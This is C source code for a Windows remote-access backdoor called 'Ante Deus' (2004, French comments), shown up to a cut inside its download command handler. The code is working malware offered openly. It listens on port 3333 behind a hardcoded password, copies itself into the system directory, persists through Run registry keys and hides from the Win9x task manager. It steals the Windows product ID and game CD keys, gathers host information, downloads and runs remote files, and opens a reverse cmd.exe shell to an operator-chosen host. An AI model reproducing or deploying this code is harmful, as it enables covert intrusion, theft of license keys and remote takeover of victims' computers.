

//         ___                               _       _
//        / _ \                             | |     | |
//  _ __ | | | |_ __   __ _ _ __ ___   ___  | | __ _| |__  ___
// | '_ \| | | | '_ \ / _` | '_ ` _ \ / _ \ | |/ _` | '_ \/ __|
// | | | | |_| | | | | (_| | | | | | |  __/ | | (_| | |_) \__ \
// |_| |_|\___/|_| |_|\__,_|_| |_| |_|\___| |_|\__,_|_.__/|___/
//
//
//  AnteDeus.c
//  By Scan-X
//  http://n0name.t35.com

#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma link "wininet.lib"

#define MAX_NB_THREAD 16
#define MAX_IP 16
#define BUFFER_SIZE 200		//netcat

#pragma comment(lib, "Ws2_32.lib")


// download/update structure
 typedef struct ds {
	char url[256];
	char dest[256];
 } ds;

// icmp.dll typedefs/structs
 typedef unsigned long IPAddr;
 typedef struct ip_option_information {
 	unsigned char Ttl;
 	unsigned char Tos;
 	unsigned char Flags;
 	unsigned char OptionsSize;
 	unsigned char FAR *OptionsData;
 } IP_OPTION_INFORMATION, *PIP_OPTION_INFORMATION;
 typedef struct icmp_echo_reply {
 	IPAddr Address;
 	unsigned long Status;
 	unsigned long RoundTripTime;
 	unsigned short DataSize;
 	unsigned short Reserved;
 	void FAR *Data;
 	struct ip_option_information Options;
 } ICMP_ECHO_REPLY;

// kernel32.dll typedefs/structs
 typedef struct tagPROCESSENTRY32 {
	DWORD dwSize;
	DWORD cntUsage;
	DWORD th32ProcessID;
	DWORD *th32DefaultHeapID;
	DWORD th32ModuleID;
	DWORD cntThreads;
	DWORD th32ParentProcessID;
	LONG pcPriClassBase;
	DWORD dwFlags;
	CHAR szExeFile[MAX_PATH];
 } PROCESSENTRY32, *LPPROCESSENTRY32;

// icmp.dll function variables
 typedef int (__stdcall *ICF)(VOID);
 ICF fIcmpCreateFile;
 typedef int (__stdcall *ISE)(HANDLE, IPAddr, LPVOID, WORD, PIP_OPTION_INFORMATION, LPVOID, DWORD, DWORD);
 ISE fIcmpSendEcho;
 typedef int (__stdcall *ICH)(HANDLE);
 ICH fIcmpCloseHandle;

// wininet.dll function variables
 typedef int (__stdcall *IGCSE)(LPDWORD, char *, DWORD, DWORD);
 IGCSE fInternetGetConnectedStateEx;
 typedef int (__stdcall *IGCS)(LPDWORD, DWORD);
 IGCS fInternetGetConnectedState;

// kernel32.dll function variables
 typedef int (__stdcall *RSP)(DWORD, DWORD);
 RSP fRegisterServiceProcess;
 typedef HANDLE (__stdcall *CT32S)(DWORD,DWORD);
 CT32S fCreateToolhelp32Snapshot;
 typedef BOOL (__stdcall *P32F)(HANDLE,LPPROCESSENTRY32);
 P32F fProcess32First;
 typedef BOOL (__stdcall *P32N)(HANDLE,LPPROCESSENTRY32);
 P32N fProcess32Next;

INT nIPAddrA = 10;
INT nIPAddrB = 0;
INT nIPAddrC = 0;
INT nIPAddrD = 0;
HANDLE hThread[MAX_NB_THREAD];

SOCKET s1, s2;
WSADATA WSAdata;
struct sockaddr_in in1, in2;
char tempdir[256];      // name of temp folder
char Invite[] = "\r\nAnte Deus>";    //Shell Invite
HKEY hKey;
HANDLE ih;              // internet handle
HANDLE threads[64];     // thread handles
char threadd[64][128];  // thread descriptions
BOOL noigcse;           // if true, InternetGetConnectedStateEx function is available

const char filename[] = "\\SystemLoader.exe"; // destination file name
const char valuename[] = "Configuration Loader"; // value name for autostart
DWORD started;

const char truePass[] = "n0name";			//AModifier ------->>> Pass standard

void connectAndInitialize(void);
char* recevoir();
BOOL pass(char* tempPass);
char* menuPrincipal(char* buff);
char* prend_ProductID(char* buff);
char* menuCdKeys(char* buff);
char* viderEtInvite(char* buff);
char* chercherKeyJeu(int rootKey, char* buff, char* key, char* value, char* found, char* notfound);
void infectSystem(char* filename1);
void uninstall(void);
char * netinfo(char *ninfo, SOCKET sock);
char * sysinfo(char *sinfo);
void webdownload(HANDLE ih, char* url, char* dest, int run);
void reverse(char *ip,unsigned short port);

/************************************************/
void connectAndInitialize(void){
	int length;
	WSAStartup(MAKEWORD(2,0),&WSAdata);
	s1 = socket(PF_INET,SOCK_STREAM,0);
	in1.sin_family = PF_INET;
	in1.sin_port = htons(3333);   //port a utiliser
	in1.sin_addr.s_addr = INADDR_ANY;
	bind(s1,(struct sockaddr*)&in1,sizeof(struct sockaddr_in));
	length = sizeof(struct sockaddr);
	listen(s1,1);
	s2 = accept(s1,(struct sockaddr*)&in2,(LPINT)&length);
}


/************************************************/
char* recevoir(){  //pour recevoir une commande
	int i = 0,j,test;
	boolean ok = 0;
	char car;
	char *buff;
	char oneShot[1] = "";

	while(!ok){
		recv(s2,buff+i,1,0);   //reception des caracteres
		car = (char) buff[i];
		test = (int) car;
		if( test == 10)
			ok = 1;
        if (test == 13){
			for(j=i;j<496;j++)
			  strcpy(buff+j,"");
	    }
        if (test == 8){
			i = i-2;
			strcpy(buff+strlen(buff),"");
	    }
		i++;
	}

	return buff;
}

/*************************************************/
BOOL pass(char* tempPass){
	if(strcmp(tempPass,truePass) == 0)
		return TRUE;
	else
		return FALSE;
}

/************************************************/
char* prend_ProductID(char* buff){//choppe la regkey ProductID de windows
	unsigned long d = 0xFF;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion"
	,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
	RegQueryValueEx(hKey,"ProductId",NULL,NULL,(LPBYTE)buff,&d);
	RegCloseKey(hKey);
	return buff;
}


/************************************************/
char* menuPrincipal(char* buff){
	strcpy(buff,"------------------------\r\n");
	strcat(buff,"-_-_-_-_ANTE DEUS_-_-_-_\r\n");
	strcat(buff,"------------------------\r\n");
	strcat(buff,"\r\nANTE DEUS V0.7...READY...\r\n(C) Made By ScAn-X  -2004- \r\nPour l'aide tapez 'help'...\r\n");
	send(s2,buff,strlen(buff),0);
	return buff;
}

/**************************************************/
char* menuCdKeys(char* buff){
	strcpy(buff,"\r\n--------Parametres-cdki--------------------\r\n");
	strcat(buff,"  -ut2k3      Unreal Tournament 2003\r\n");
	strcat(buff,"  -ut2k4      Unreal Tournament 2004\r\n");
	strcat(buff,"  -chaser     Chaser\r\n");
	strcat(buff,"  -sacred     Sacred\r\n");
	strcat(buff,"  -cs         Counter Strike\r\n");
	strcat(buff,"  -igi2       Project IGI 2\r\n");
	strcat(buff,"  -1942       BattleField 1942\r\n");
	strcat(buff,"  -1942rtr    BattleField 1942 Road To Rome\r\n");
	strcat(buff,"  -raven      Rainbow Six III RavenShield\r\n");
	strcat(buff,"  -ccgen      Command and Conquer Generals\r\n");
	strcat(buff,"  -glad       The Gladiators\r\n");
	strcat(buff,"-------------------------------------------\r\n");
	strcat(buff,"ex: cdki -ut2k4  : get UT2004 CD Key\r\n");
	send(s2,buff,strlen(buff),0);
	return buff;
}

/**************************************************/
char* aboutBox(char* buff){
	strcpy(buff,"\r\n");
	strcat(buff,"     _       ___  __\r\n");
	strcat(buff,"    /_\\ |\\||(   )(_\r\n");
	strcat(buff,"   (___)|\\_| |_| (__\r\n");
	strcat(buff,"    _  __       __\r\n");
	strcat(buff,"   | \\(_  |  | ( _)\r\n");
    strcat(buff,"   |_/(__ |__|(__)\r\n");
    strcat(buff,"\r\n");
	strcat(buff,"        By\r\n");
	strcat(buff,"\r\n");
	strcat(buff,"           __  __ \r\n");
	strcat(buff,"  .....:::(  )(  ):::......\r\n");
	strcat(buff,"   __  __  \\ \\/ /   _\r\n");
	strcat(buff,"  ( _)/ _)  \\  /   /_\\ |\\||\r\n");
	strcat(buff," (__) \\__)  /  \\  (___)|\\_|\r\n");
	strcat(buff,"  ........./ /\\ \\..........\r\n");
    strcat(buff,"       :::(__)(__):::\r\n");
	send(s2,buff,strlen(buff),0);
	return buff;
}


/**************************************************/
char* viderEtInvite(char* buff){
	memset(buff,0,sizeof(buff));
	strcpy(buff,Invite);
	send(s2,buff,strlen(buff),0);
	return buff;
}

/**************************************************/
char* chercherKeyJeu(int rootKey, char* buff, char* key, char* value, char* found, char* notfound){
	unsigned char szDataBuf[128];
	HKEY hkey;
    DWORD dwSize = 128;
	LONG lRet;


	dwSize = 128;
	if (rootKey == 1)
	  lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &hkey);
	if (rootKey == 2)
	  lRet = RegOpenKeyEx(HKEY_CURRENT_USER, key, 0, KEY_READ, &hkey);

	if(RegQueryValueEx(hkey, value, NULL, NULL, szDataBuf, &dwSize)== ERROR_SUCCESS) {
		sprintf(buff, found, szDataBuf);
		send(s2, buff, strlen(buff),0);
	}
	else{
		sprintf(buff, notfound);
		send(s2, buff, strlen(buff),0);
	}
	RegCloseKey(hkey);
	viderEtInvite(buff);
	return buff;
}

/*******************************************************/
void infectSystem(char* filename1){
	HKEY key;

    printf("\r\nNow Infecting Registry...\r\nSucceed...");

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	RegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)&filename1, sizeof(filename1)+1);
	RegCloseKey(key);

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	RegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)&filename1, sizeof(filename1)+1);
	RegCloseKey(key);

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	RegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)&filename1, sizeof(filename1)+1);
	RegCloseKey(key);

	RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	RegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)&filename1, sizeof(filename1)+1);
	RegCloseKey(key);

	RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	RegSetValueEx(key, valuename, 0, REG_SZ, (const unsigned char *)&filename1, sizeof(filename1)+1);
	RegCloseKey(key);
}

/******************************************************************/
 void uninstall(void){
	HKEY key;
	HANDLE f;
	DWORD r;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	char tempChaine[] = "@echo off\r\n:start\r\nif not exist \"\"%1\"\" goto done\r\ndel /F \"\"%1\"\"\r\ndel \"\"%1\"\"\r\ngoto start\r\n:done\r\ndel /F %temp%\\o.bat\r\ndel %temp%\\o.bat\r\n";
	//char tempChaine[] = "@echo off\r\ndel /F \"\"%1\"\"\r\ndel \"\"%1\"\"\r\ndel /F %temp%\\o.bat\r\ndel %temp%\\o.bat\r\n";

	char cmdline[500];
	char tcmdline[1000];
	char cfilename[256];
	char batfile[256];
	char buffer[100];

	// effacer entrees ds la base de registre
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	RegDeleteValue(key, valuename);
	RegCloseKey(key);

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	RegDeleteValue(key, valuename);
	RegCloseKey(key);

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	RegDeleteValue(key, valuename);
	RegCloseKey(key);

	RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	RegDeleteValue(key, valuename);
	RegCloseKey(key);

	RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	RegDeleteValue(key, valuename);
	RegCloseKey(key);

	sprintf(batfile, "%s\o.bat", tempdir);
	f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		// ecriture d'un fichier batch pr effacer notre exe apres qu'on ai quitté
		WriteFile(f, tempChaine, strlen(tempChaine) , &r, NULL);
		CloseHandle(f);

		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;

		GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));// recuperation de notre exe

		strcpy(tcmdline, "%comspec% /c ");
		strcat(tcmdline,batfile);
		strcat(tcmdline," ");
		strcat(tcmdline,cfilename);

		ExpandEnvironmentStrings(tcmdline, cmdline, sizeof(cmdline)); // mettre le nom de l'interpreteur de commande dans la ligne de commmande

		// execution du fichier batch
		CreateProcess(NULL, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
		strcpy(buffer,"\r\nAll Corruption removed...exiting\n");
		send(s2,buffer,strlen(buffer),0);
		shutdown(s1,2);
		closesocket(s1);
		shutdown(s2,2);
		closesocket(s2);
		WSACleanup();
		exit(0);
	}
 }

/*************************************************************/
// function used for netinfo
 char * netinfo(char *ninfo, SOCKET sock){

	SOCKADDR sa;
	int sas;
	DWORD n;
	char ctype[8];
	char cname[128];

	// get connection type/name
	memset(cname, 0, sizeof(cname));
	memset(ctype, 0, sizeof(ctype));
	if (!noigcse) {
		fInternetGetConnectedStateEx(&n, (char *)&cname, sizeof(cname), 0);
    	if (n & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM) strncpy(ctype,  "dial-up", sizeof(ctype)-1);
	 	else strncpy(ctype,  "LAN", sizeof(ctype)-1);
	} else {
		strncpy(ctype, "N/A", sizeof(ctype)-1);
		strncpy(cname, "N/A", sizeof(cname)-1);
	}

	// get ip address
	sas = sizeof(sa);
	memset(&sa, 0, sizeof(sa));
	getsockname(sock, &sa, &sas);

	sprintf(ninfo, "\r\nconnection type: %s (%s).\r\nlocal IP address: %d.%d.%d.%d.", ctype, cname, (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);
	return ninfo; // return the netinfo string
 }

/*********************************************************/
char * sysinfo(char *sinfo)
 {
	int total,backTime;
	char *os;
	char os2[140];
	MEMORYSTATUS memstat;
	OSVERSIONINFO verinfo;
	char szBuffer[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD dwNameSize = MAX_COMPUTERNAME_LENGTH + 1;
	char *szCompname;
	TCHAR szUserName[21];
	DWORD dwUserSize = sizeof(szUserName);

	GlobalMemoryStatus(&memstat); // chargement des infos memoire dans memstat
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); // requis pour une raison etrange
	GetVersionEx(&verinfo); // chargement info version dans verinfo
	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2000";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else os = "???";

	if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0] != '\0') {
		sprintf(os2, "%s [%s]", os, verinfo.szCSDVersion);
		os = os2;
	}

	total = GetTickCount() / 1000; // GetTickCount() / 1000 = uptime

	GetComputerName(szBuffer, &dwNameSize);
	szCompname = szBuffer;
	GetUserName(szUserName, &dwUserSize);

	backTime = total - started;
	sprintf(sinfo, "\r\nram:\ttotal: %dMB\tfree: %dMB.\r\n----\r\nos:\tWindows %s (%d.%d, build %d).\r\n---\r\nuptime:\t%dd %dh %dm %ds.\r\n-------\r\nbox:\t%s.\r\n----\r\nuser:\t%s.\r\n-----\r\nBackDoor run since :\t%dd %dh %dm %ds.\r\n",
		memstat.dwTotalPhys / 1048576, memstat.dwAvailPhys / 1048576,
		os, verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber, total / 86400, (total % 86400) / 3600, ((total % 86400) % 3600) / 60, (((total % 86400) % 3600) %60), szCompname, szUserName, backTime / 86400, (backTime % 86400) / 3600, ((backTime % 86400) % 3600) / 60, (((backTime % 86400) % 3600) %60)) ;

	return sinfo;
 }

/***********************************************************/
 void webdownload(HANDLE ih, char* url, char* dest, int run){
 	char fbuff[512] = "";
 	char tstr[256] = "";
 	char tempBuff[256] = "";

 	HANDLE fh, f;
 	long start;
 	float total;
 	float speed;
 	DWORD r, d;
 	PROCESS_INFORMATION pinfo;
 	STARTUPINFO sinfo;
 	SYSTEMTIME st;
	DWORD startsecs;
 	ds dl;

 	sprintf(tstr, "\r\nplease wait...downloading...\r\n");
 	send(s2,tstr,sizeof(tstr),0);

 	memset(dl.url,0,sizeof(dl.url));
 	memset(dl.dest,0,sizeof(dl.dest));

 	sprintf(dl.url,url);
 	sprintf(dl.dest,dest);
 	fh = InternetOpenUrl(ih, dl.url, NULL, 0, 0, 0);
 	if (fh != NULL) {
 		// ouverture du fichier
 		f = CreateFile(dl.dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
 		// s'assurer que le handle de fichier est valide
 		if (f < (HANDLE)1) {
			memset(tempBuff,0,sizeof(tempBuff));
			sprintf(tempBuff,"couldn't open %s.\r\n", dl.dest);
 			send(s2,tempBuff,sizeof(tempBuff),0);
 			return 0;
 		}

 		total = 1;
 		start = GetTickCount();
 		GetSystemTime(&st);
 		startsecs = st.wMilliseconds + (st.wSecond * 1000);

 		do {
 			memset(fbuff, 0, sizeof(fbuff));
 			memset(tempBuff, 0, sizeof(tempBuff));

 			InternetReadFile(fh, fbuff, sizeof(fbuff), &r);
 			WriteFile(f, fbuff, r, &d, NULL);
 			total = total + r;
 		} while (r > 0);

		GetSystemTime(&st);
 		//speed = total / (((GetTickCount() - start) / 1000) + 1);
 		printf("total : %.1f\r\nseconds : %d\r\n",total,startsecs);
 		speed = total / ((((st.wSecond * 1000 + st.wMilliseconds) - startsecs) / 1000) + 1);

 		CloseHandle(f);

		memset(tstr,0,sizeof(tstr));
 		sprintf(tstr, "\r\ndownloaded %.1f kb to %s @ %.1f kb/sec.\r\n", total / 1024.0, dl.dest, speed / 1024.0);
 		send(s2,tstr,sizeof(tstr),0);

 		if (run == 1) {
 			ShellExecute(0, "open", dl.dest, NULL, NULL, SW_SHOW);
 			memset(tempBuff,0,sizeof(tempBuff));
 			sprintf(tempBuff,"opened %s.\r\n", dl.dest);
 			send(s2,tempBuff,sizeof(tempBuff),0);
 		}
 	}
 	else{
		memset(tempBuff,0,sizeof(tempBuff));
		sprintf(tempBuff,"\r\nbad url, or dns error.");
		send(s2,tempBuff,strlen(tempBuff),0);
	}

 	InternetCloseHandle(fh);
 }



/***************************************************/
void reverse(char *ip, unsigned short port){
	struct hostent *hoste;

	char host[20];
	char buf[80];

	int verdict;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	struct sockaddr_in sin;
	int size = sizeof(sin);
	int sock;
	WSADATA wd;

	strcpy(host, ip);
	WSAStartup(MAKEWORD( 1, 1 ), &wd);
	sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	while ((hoste = gethostbyname (host))== NULL)
	{
	    sleep(2000);
	}

	sprintf(buf, "DNS resolu\r\n");
	send(s2,buf,strlen(buf),0);

	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	memcpy(&(sin.sin_addr),hoste->h_addr,hoste->h_length);
	while ((connect(sock, (struct sockaddr*)&sin, size))<0)
	{
	    sleep(2000);
	}

	sprintf(buf, "Envoi du shell\r\n");
	send(s2,buf,strlen(buf),0);

	memset(&si, 0, sizeof(si));
	si.cb=sizeof(si);
	si.dwFlags=STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.wShowWindow=SW_HIDE;
	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) sock;
	verdict = CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,TEXT("c:\\"),&si,&pi);
	if (verdict){
	  sprintf(buf, "OK\r\n");
	  send(s2,buf,strlen(buf),0);
    }else{
	  sprintf(buf, "Erreur\r\n");
	  send(s2,buf,strlen(buf),0);
    }
}

/************************************************/
/************************************************        <-------Debut du programme*/
/************************************************/
void main(void){
	char buffer[1000] = "";    //date buffer
	char tempBuff[256] = "";
	char cfilename[256] = "";
	char sysdir[256] = "";
	char tstr[256] = "";
	char filename1[64] = "";
	char status[256] = "";
	char dest[256] = "";
	char url[256] = "";
	char ip[10] = "";
	char len[20] = "";
	char port[20] = "";
	unsigned short reversePort;
	char target[20] = "";
	int copies = 0, err = 0, update = 0;

	WSADATA wsadata;

	HINSTANCE kernel32_dll;
	HINSTANCE wininet_dll;
	HINSTANCE icmp_dll;

    HANDLE psnap;
    PROCESSENTRY32 pe32 = {0};
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	HKEY key;
	BOOL noigcs;
	BOOL noicmp;

	started = GetTickCount()/1000;

	// charger les fctions de icmp.dll
 	icmp_dll = LoadLibrary("ICMP.DLL");
    if (icmp_dll == 0) noicmp = TRUE;
 	else {
	 	fIcmpCreateFile  = (ICF)GetProcAddress(icmp_dll,"IcmpCreateFile");
 		fIcmpCloseHandle = (ICH)GetProcAddress(icmp_dll,"IcmpCloseHandle");
 		fIcmpSendEcho    = (ISE)GetProcAddress(icmp_dll,"IcmpSendEcho");
 		if (!fIcmpCreateFile || !fIcmpCloseHandle || !fIcmpSendEcho) {
	        noicmp = TRUE;
	    }
	}

	// charger les fctions du kernel32.dll et se cacher du gestionnaire de tache de win9x
	kernel32_dll = LoadLibrary("kernel32.dll");
	if (kernel32_dll) {
		fRegisterServiceProcess = (RSP)GetProcAddress(kernel32_dll, "RegisterServiceProcess");
		fCreateToolhelp32Snapshot = (CT32S)GetProcAddress(kernel32_dll, "CreateToolhelp32Snapshot");
		fProcess32First = (P32F)GetProcAddress(kernel32_dll, "Process32First");
		fProcess32Next = (P32N)GetProcAddress(kernel32_dll, "Process32Next");

		if (fRegisterServiceProcess) fRegisterServiceProcess(0, 1);
	}

	// initialiser le matos wininet
	ih = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (ih == NULL) ih = 0;
	wininet_dll = LoadLibrary("WININET.DLL");
	// voir si InternetGetConnectedStateEx est dispo
    if (wininet_dll == 0) noigcse = TRUE;
 	else {
		fInternetGetConnectedState = (IGCS)GetProcAddress(wininet_dll, "InternetGetConnectedState");
		if (!fInternetGetConnectedState) {
			noigcs = TRUE;
		} else noigcs = TRUE;

	 	fInternetGetConnectedStateEx = (IGCSE)GetProcAddress(wininet_dll, "InternetGetConnectedStateEx");
 		if (!fInternetGetConnectedStateEx) {
	        noigcse = TRUE;
	    } else noigcse = FALSE;
	}
	memset(cfilename,0,sizeof(cfilename));
	// chopper le path de notre fichier et du tempdir
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	GetTempPath(sizeof(tempdir), tempdir);
	GetSystemDirectory(sysdir, sizeof(sysdir));

	// verification si l'exe tourne deja
	if (fCreateToolhelp32Snapshot && fProcess32First && fProcess32Next) {
		psnap = fCreateToolhelp32Snapshot(2, 0);
		if (psnap != INVALID_HANDLE_VALUE) {
			pe32.dwSize = sizeof(PROCESSENTRY32);
			if (fProcess32First(psnap, &pe32)) {
				do {
					if (strncmp(cfilename+(strlen(cfilename)-strlen(pe32.szExeFile)), pe32.szExeFile, strlen(pe32.szExeFile)) == 0) copies++;
				} while (fProcess32Next(psnap, &pe32));
			}
			CloseHandle (psnap);
			// si l'exe tourne deja exit
			if (copies > 1)  exit(0);
		}
	}

	if (strstr(cfilename, sysdir) == NULL) {
		//copie du fichier ds le systemdir
		sprintf(filename1 , strcat(sysdir,filename));
		if (CopyFile(cfilename, filename1,1) == 0){
		  strcpy(status,"Failure to copy the file");
		  send(s2,status,strlen(status),0);
		}
		else{
		  strcpy(status,"\r\nInfecting SystemDirectory...Success...\r\nInfection accomplished in ");
		  strcat(status,sysdir);
		  strcat(status,"...");
		  send(s2,status,strlen(status),0);
	    }

		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;
		WSACleanup();
		if (CreateProcess(NULL, sysdir, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo))
		  exit(0);
	}

	connectAndInitialize();

	strcpy(buffer,"Introduisez le pass\r\n");
	send(s2,buffer,strlen(buffer),0);

	while(!pass(tempBuff)){
		strcpy(tempBuff,recevoir());
		if(!pass(tempBuff)){
			strcpy(buffer,"\r\naccess denied...retry\r\n");
			send(s2,buffer,strlen(buffer),0);
		}

	}

	strcpy(buffer,"\r\naccess granted\r\n");
	send(s2,buffer,strlen(buffer),0);

	menuPrincipal(buffer);
	strcpy(buffer,Invite);
	send(s2,buffer,strlen(buffer),0);

	while(1){
		memset(buffer,0,sizeof(buffer));
		strcpy(buffer,recevoir());

		if(strcmp(buffer,"help") == 0){
			strcpy(buffer,"\r\n------------------------------------\r\n");
			strcat(buffer,"- Commandes Disponibles :     -\r\n");
			strcat(buffer,"------------------------------------\r\n");
			strcat(buffer,"help         ici meme\r\n");
			strcat(buffer,"about        About Box\r\n");
			strcat(buffer,"prod         obtenir la productID\r\n");
			strcat(buffer,"netinfo      Obtenir infos reseau\r\n");
			strcat(buffer,"sysinfo      Obtenir infos systeme\r\n");
			strcat(buffer,"infect       Infecter le systeme\r\n");
			strcat(buffer,"cdki         prendre CD KEY Jeu\r\n");
			strcat(buffer,"cdrom        Ouvrir/Fermer CDRom\r\n");
			strcat(buffer,"download     Downloader fichier ou update\r\n");
			strcat(buffer,"uninstall    Nettoyer le systeme\r\n");
			strcat(buffer,"reverse      envoyer un reverse shell\r\n");
			strcat(buffer,"quit/exit    quitter\r\n");
			strcat(buffer,"------------------------------------\r\n");
			send(s2,buffer,strlen(buffer),0);
			strcpy(buffer,Invite);
			send(s2,buffer,strlen(buffer),0);
		}

		else if(strcmp(buffer,"about") == 0){
			aboutBox(buffer);

			viderEtInvite(buffer);
		}

		else if(strcmp(buffer,"cdrom") == 0){
			memset(tempBuff,0,sizeof(tempBuff));
			sprintf(tempBuff,"\r\nOpen : 1\r\nClose : 0\r\n");
			send(s2,tempBuff,strlen(tempBuff),0);

			strcpy(tempBuff,recevoir());
			if(strcmp(tempBuff, "0") == 0){
				mciSendString("set CDAudio door closed", NULL, 127, 0);
				sprintf(tempBuff,"\r\nCDRom closed...\r\n");
				send(s2,tempBuff,strlen(tempBuff),0);
			}
			else if(strcmp(tempBuff, "1") == 0){
				mciSendString("set CDAudio door open", NULL, 127, 0);
				sprintf(tempBuff,"\r\nCDRom open...\r\n");
				send(s2,tempBuff,strlen(tempBuff),0);
			}
			else{
				sprintf(tempBuff,"\r\nBad Option...cancelled\r\n");
				send(s2,tempBuff,strlen(tempBuff),0);
			}
			viderEtInvite(buffer);
		}


		else if(strcmp(buffer,"prod") == 0){
			strcpy(buffer,"\r\nProduct ID:");
			send(s2,buffer,sizeof(buffer),0);
			send(s2,prend_ProductID(buffer),sizeof(buffer),0);  //send Product ID

			viderEtInvite(buffer);
		}

		else if(strcmp(buffer,"netinfo") == 0){
			send(s2,netinfo(buffer, s2),sizeof(buffer),0);

			viderEtInvite(buffer);
		}

		else if(strcmp(buffer,"sysinfo") == 0){
			send(s2,sysinfo(buffer),sizeof(buffer),0);

			viderEtInvite(buffer);
		}

		else if(strcmp(buffer,"download") == 0){
				memset(tempBuff,0,sizeof(tempBuff));
				memset(url,0,sizeof(url));
				memset(dest,0,sizeof(dest));

				sprintf(tempBuff,"\r\nentrez l'url complete\r\n");
				send(s2,tempBuff,strlen(tempBuff),0);

				strcpy(url,recevoir());

				memset(tempBuff,0,sizeof(tempBuff));

				sprintf(tempBuff,"\r\nnom fichier destination? ex : netcat.exe\r\n");
				send(s2,tempBuff,strlen(tempBuff),0);

				strcpy(dest,sysdir);
				strcpy(tempBuff,recevoir());
				strcat(dest,"\\");
				strcat(dest,tempBuff);

 				memset(tempBuff,0,sizeof(tempBuff));
 				sprintf(tempBuff,"\r\nlancer le fichier apres le transfert?(y/n)");
				send(s2,tempBuff,strlen(tempBuff),0);
 				memset(tempBuff,0,sizeof(tempBuff));
				strcpy(tempBuff,recevoir());
